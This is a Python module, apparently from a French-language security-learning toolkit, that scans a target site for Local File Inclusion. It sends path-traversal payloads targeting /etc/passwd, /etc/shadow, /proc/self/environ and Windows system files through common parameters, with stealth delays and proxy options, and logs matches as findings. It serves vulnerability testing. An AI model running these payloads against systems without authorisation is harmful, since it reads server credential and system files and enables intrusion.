"""Détection de Local File Inclusion (LFI) sur paramètres suspects."""

from __future__ import annotations

import re

from learnwhitehack.core.config import AppConfig
from learnwhitehack.core.http_client import make_session
from learnwhitehack.core.logger import get_logger
from learnwhitehack.core.reporter import Report, Severity

log = get_logger("vuln.lfi_probe")

_LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "../etc/shadow",
    "../../etc/shadow",
    "../../../windows/win.ini",
    "../../../windows/system32/drivers/etc/hosts",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/version",
]

_LFI_INDICATORS = [
    r"root:x?:0:0:",          # /etc/passwd Unix
    r"nobody:x?:",             # /etc/passwd
    r"\[boot loader\]",        # boot.ini Windows
    r"\[fonts\]",              # win.ini Windows
    r"Linux version",          # /proc/version
    r"HTTP_USER_AGENT",        # /proc/self/environ
    r"DOCUMENT_ROOT",          # /proc/self/environ
]
_RE_LFI = re.compile("|".join(_LFI_INDICATORS), re.IGNORECASE)

_DEFAULT_PARAMS = ["page", "file", "include", "template", "view", "doc",
                   "path", "lang", "language", "module", "plugin", "content"]


def run(
    cfg: AppConfig,
    report: Report,
    params: list[str] | None = None,
    urls: list[str] | None = None,
) -> list[dict[str, object]]:
    """Teste les paramètres suspects pour une LFI."""
    base_url = cfg.target.url.rstrip("/")
    if not base_url:
        log.error("Aucune URL cible configurée.")
        return []

    target_params = params or _DEFAULT_PARAMS
    test_urls = urls or [base_url + "/"]

    log.info(
        f"[bold]vuln.lfi_probe[/] → {base_url} "
        f"({len(target_params)} paramètres, {len(_LFI_PAYLOADS)} payloads)"
    )

    session = make_session(
        min_delay=cfg.stealth.min_delay,
        max_delay=cfg.stealth.max_delay,
        proxies=cfg.stealth.proxies,
        verify_ssl=cfg.http.verify_ssl,
    )

    vulnerabilities: list[dict[str, object]] = []

    for base in test_urls:
        for param in target_params:
            for payload in _LFI_PAYLOADS:
                url = f"{base}{'&' if '?' in base else '?'}{param}={payload}"
                try:
                    resp = session.get(url, timeout=cfg.http.timeout)
                except Exception as e:
                    log.debug(f"Erreur {url}: {e}")
                    continue

                if _RE_LFI.search(resp.text):
                    log.info(f"  [red]LFI possible[/] : param={param}, payload={payload!r}")
                    vuln = {"url": url, "param": param, "payload": payload}
                    vulnerabilities.append(vuln)

                    report.add_finding(
                        module="vuln.lfi_probe",
                        severity=Severity.CRITICAL,
                        title=f"Local File Inclusion détectée : paramètre '{param}'",
                        detail=(
                            f"Le paramètre '{param}' permet d'inclure des fichiers locaux du serveur. "
                            f"Payload: {payload!r}"
                        ),
                        evidence={
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "response_excerpt": resp.text[:500],
                        },
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://portswigger.net/web-security/file-path-traversal",
                        ],
                    )
                    break

    if not vulnerabilities:
        log.info("  Aucune LFI détectée sur les paramètres testés.")

    return vulnerabilities
